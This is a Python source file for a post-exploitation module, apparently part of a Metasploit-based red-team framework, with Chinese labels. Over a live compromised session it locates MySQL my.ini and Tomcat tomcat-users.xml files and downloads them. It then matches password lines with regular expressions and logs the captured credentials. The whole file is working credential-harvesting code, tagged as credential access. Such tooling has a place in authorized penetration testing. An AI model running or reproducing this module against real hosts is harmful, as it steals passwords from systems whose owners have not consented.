# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

#
#

import re

from PostModule.lib.ModuleTemplate import TAG2CH, PostMSFRawModule
from PostModule.lib.MsfFile import MsfFile
from PostModule.lib.OptionAndResult import register_options


class PostModule(PostMSFRawModule):
    NAME = "收集主机配置文件中的敏感信息"
    DESC = "模块在主机中搜索包含敏感信息的配置文件(my.ini,tomcat-users.xml等),\n" \
           "通过预定义的正则表达式匹配敏感信息(密码,hash等)."
    REQUIRE_SESSION = True
    MODULETYPE = TAG2CH.Credential_Access
    OPTIONS = register_options([
    ])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.type = "post"
        self.mname = "multi/gather/conf_infos"
        self.runasjob = False
        self.re_conf = {
            'mysql': {
                'my.ini': ['^\s*password\s*=']
            },
            'tomcat': {
                'tomcat-users.xml': ['password\s*=']
            }
        }

    def check(self):
        """执行前的检查函数"""
        from PostModule.lib.Session import Session
        session = Session(self._sessionid)
        if session.is_alive:

            return True, None
        else:
            return False, "当前Session不可用"

    def callback(self, status, message, data):
        if status:
            for one in data:
                # [{"path":"c:\\xampp\\mysql\\bin","name":"my.ini","size":5762,"localpath":"1557900758_my.ini"}]
                conf_files = one.get('files')
                # {"path":"c:\\xampp\\mysql\\bin","name":"my.ini","size":5762,"localpath":"1557900758_my.ini"}
                for conf_file in conf_files:
                    self.log_good("发现敏感文件")
                    self.log_status(
                        "主机文件路径: {} 文件名: {}".format(conf_file.get('path'), conf_file.get('name')))
                    self.log_status("下载到本地文件名: {}".format(conf_file.get('localpath')))
                    self.log_raw('\n')
                    filedata = MsfFile.cat_file(conf_file.get('localpath'))

                    if filedata is None:
                        self.log_error("{} 文件不存在".format(conf_file.get('localpath')))
                        return

                    filedata = filedata.decode('utf-8', 'ignore')
                    for line in filedata.split('\n'):
                        res = self.re_conf.get(one.get('name')).get(one.get('configfile'))
                        for one_re in res:
                            if re.search(one_re, line):
                                self.log_good("发现敏感信息")
                                self.log_status(
                                    "主机文件路径: {} 文件名: {}".format(conf_file.get('path'), conf_file.get('name')))
                                self.log_status("下载到本地文件名: {}".format(conf_file.get('localpath')))
                                self.log_status("敏感信息: {}".format(line))
                                self.log_raw('\n')
            self.log_status("模块执行完成")
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
